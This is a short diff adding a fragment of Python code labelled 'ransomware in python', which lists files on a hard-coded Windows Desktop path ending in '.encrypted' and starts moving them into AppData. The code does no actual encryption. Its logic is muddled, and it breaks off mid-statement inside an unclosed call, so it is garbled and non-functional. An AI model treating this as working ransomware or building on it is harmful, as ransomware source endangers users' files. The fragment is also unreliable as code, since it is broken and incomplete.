@@ -1,0 +1,17 @@
+import shutil, os, json, hashlib
+import time, re
+
+def main():
+    # Set the extension to be encrypted
+    extension = '.encrypted'
+
+    # Lock the files
+    for f in os.listdir('C:\\Users\\username\\Desktop'):
+        # If the file has .encrypted extension, lock it
+        if f.endswith(extension):
+            shutil.move('C:\\Users\\username\\Desktop\\' + f,
+               'C:\\Users\\username\\AppData\\Local\\' + f.replace(extension
+
+
+
+ransomware in python
